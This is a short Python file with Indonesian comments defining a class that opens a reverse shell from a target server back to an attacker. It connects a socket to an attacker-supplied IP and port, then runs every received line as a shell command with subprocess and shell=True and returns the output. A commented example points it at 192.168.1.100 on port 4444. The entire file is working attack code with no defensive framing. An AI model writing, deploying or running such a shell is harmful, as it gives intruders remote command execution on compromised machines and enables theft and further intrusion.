import socket
import subprocess
import logging

logger = logging.getLogger(__name__)

class WebShellReverseShell:
    def __init__(self, attack_ip, attack_port):
        self.attack_ip = attack_ip
        self.attack_port = attack_port

    def create_reverse_shell(self):
        """
        Membuat reverse shell dari server target ke attacker.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.attack_ip, self.attack_port))
            s.send(b"Connected to reverse shell.\n")
            while True:
                data = s.recv(1024)
                if data.decode("utf-8").strip().lower() == 'exit':
                    break
                output = subprocess.check_output(data, shell=True)
                s.send(output)
            s.close()
        except Exception as e:
            logger.error(f"Error during reverse shell execution: {str(e)}")

# Contoh penggunaan:
# reverse_shell = WebShellReverseShell("192.168.1.100", 4444)
# reverse_shell.create_reverse_shell()
